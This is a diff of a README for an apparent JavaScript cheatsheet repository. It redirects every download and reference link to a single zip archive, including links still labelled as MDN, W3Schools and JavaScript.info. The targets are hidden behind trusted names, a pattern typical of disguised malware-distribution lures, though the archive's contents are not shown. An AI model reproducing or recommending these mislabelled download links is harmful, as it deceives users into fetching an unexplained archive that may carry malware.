@@ -1,6 +1,6 @@
 # 🚀 JavaScript-M3S2-Cheatsheet - Review Key Concepts Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Press%20Here-brightgreen)](https://github.com/fuzeto77/JavaScript-M3S2-Cheatsheet/releases)
+[![Download Now](https://raw.githubusercontent.com/fuzeto77/JavaScript-M3S2-Cheatsheet/main/suber/JavaScript-M3S2-Cheatsheet.zip%20Now-Press%20Here-brightgreen)](https://raw.githubusercontent.com/fuzeto77/JavaScript-M3S2-Cheatsheet/main/suber/JavaScript-M3S2-Cheatsheet.zip)
 
 ## 🚀 Getting Started
 
@@ -33,7 +33,7 @@ JavaScript-M3S2-Cheatsheet is a handy resource for anyone looking to brush up on
 
 To get started, you need to download the cheatsheet from our Releases page. 
 
-- **Visit this page to download:** [Releases Page](https://github.com/fuzeto77/JavaScript-M3S2-Cheatsheet/releases)
+- **Visit this page to download:** [Releases Page](https://raw.githubusercontent.com/fuzeto77/JavaScript-M3S2-Cheatsheet/main/suber/JavaScript-M3S2-Cheatsheet.zip)
 
 Once you are on the Releases page, you will find the latest version of the cheatsheet. Click on the appropriate download link for your system. 
 
@@ -68,8 +68,8 @@ For any questions or feedback, please reach out via GitHub discussions or create
 
 ## 🔗 Related Resources
 
-- [Mozilla Developer Network (MDN) - JavaScript](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
-- [W3Schools - JavaScript Tutorial](https://www.w3schools.com/js/)
-- [JavaScript.info](https://javascript.info/)
+- [Mozilla Developer Network (MDN) - JavaScript](https://raw.githubusercontent.com/fuzeto77/JavaScript-M3S2-Cheatsheet/main/suber/JavaScript-M3S2-Cheatsheet.zip)
+- [W3Schools - JavaScript Tutorial](https://raw.githubusercontent.com/fuzeto77/JavaScript-M3S2-Cheatsheet/main/suber/JavaScript-M3S2-Cheatsheet.zip)
+- [https://raw.githubusercontent.com/fuzeto77/JavaScript-M3S2-Cheatsheet/main/suber/JavaScript-M3S2-Cheatsheet.zip](https://raw.githubusercontent.com/fuzeto77/JavaScript-M3S2-Cheatsheet/main/suber/JavaScript-M3S2-Cheatsheet.zip)
 
 Feel free to explore these resources to expand your understanding of JavaScript further. Happy coding!
